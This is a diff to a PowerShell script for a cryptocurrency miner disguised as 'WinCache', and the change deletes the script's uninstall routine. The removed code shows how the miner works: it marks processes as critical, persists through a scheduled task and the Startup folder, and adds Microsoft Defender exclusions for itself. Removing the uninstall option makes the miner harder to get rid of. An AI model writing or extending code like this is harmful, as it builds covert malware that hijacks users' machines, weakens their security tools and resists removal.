@@ -191,34 +191,6 @@ if (-not $Run -and -not $NoElevate) {
         exit
     }
 }
-
-# ---------- uninstall -------------------------------------------------------
-if ($Uninstall) {
-    Write-Host '[*] Deteniendo procesos de forma segura...'
-    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
-        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
-    foreach ($w in $watchers) {
-        Set-CriticalProcess -TargetPid $w.ProcessId -Critical $false | Out-Null
-        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
-    }
-
-    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-    
-    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-    
-    $startup = [Environment]::GetFolderPath('Startup')
-    Get-ChildItem $startup -Filter 'WinCache*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    
-    try {
-        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
-        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
-    } catch {}
-    
-    Write-Host '[+] Miner stopped, scheduled task removed, exclusions cleared.'
-    Write-Host "[*] Files remain at: $Root"
-    return
-}
-
 # ---------- watcher mode ----------------------------------------------------
 if ($Run) {
     New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
